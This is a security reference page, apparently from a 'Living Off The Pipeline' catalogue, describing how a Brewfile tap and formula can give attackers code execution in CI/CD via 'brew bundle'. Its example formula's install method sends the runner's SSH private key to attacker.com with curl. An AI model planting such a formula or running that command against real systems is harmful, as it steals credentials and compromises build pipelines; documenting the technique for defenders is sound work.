---
layout: tool
title: brew
tags: [cli, config-file, eval-ruby, rce]
references:
- https://github.com/Homebrew/homebrew-bundle
- https://docs.brew.sh/Formula-Cookbook
files: [Brewfile]
---

## Living Off The Pipeline - brew (Homebrew)

`Homebrew` is a popular package manager for macOS and Linux. Its reliance on executable Ruby scripts ("formulae") and third-party repositories ("taps") makes it a powerful "Living Off The Pipeline" (LOTP) tool.

### First-Order LOTP Tool

`brew` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as its purpose is to execute installation scripts from potentially attacker-controlled sources.

#### Malicious Primitive: Remote Code Execution (RCE)

The primary vector for `brew` is the `Brewfile`, which is a repository-local file that lists project dependencies. An attacker can add two key items to this file:
1.  A `tap` line, which points to their own malicious Git repository containing Homebrew formulae.
2.  A `brew` line, which instructs Homebrew to install a formula from that malicious tap.

A Homebrew formula is a Ruby script. The `install` method of a formula can contain arbitrary shell commands. When a CI/CD pipeline runs `brew bundle` to install dependencies from the `Brewfile`, it will execute the `install` method of the attacker's formula.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request containing a modified `Brewfile`.
    ```ruby
    # Brewfile
    tap "attacker/homebrew-pwn"
    brew "malicious-formula"
    ```

2.  **Attacker's Tap:** The attacker hosts a public Git repository (e.g., `github.com/attacker/homebrew-pwn`) containing their malicious formula.
    ```ruby
    # malicious-formula.rb
    class MaliciousFormula < Formula
      homepage "https://attacker.com"
      url "https://attacker.com/v1.0.tar.gz" # Dummy URL
      sha256 "..." # Dummy checksum

      def install
        # Malicious payload
        system "curl --data-binary @$HOME/.ssh/id_rsa http://attacker.com/"
      end
    end
    ```

3.  **Vulnerable Workflow:** The pipeline contains a standard command to install dependencies.
    ```yaml
    - name: Install Homebrew dependencies
      run: brew bundle
    ```

4.  **Execution:**
    *   The `brew bundle` command is executed.
    *   It reads the `Brewfile`, adds the attacker's `tap`, and then proceeds to install `malicious-formula`.
    *   To install the formula, Homebrew executes the Ruby code in the `install` method.
    *   The attacker's `system` command runs, exfiltrating sensitive files.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in a remote repository that is trusted and executed by the package manager.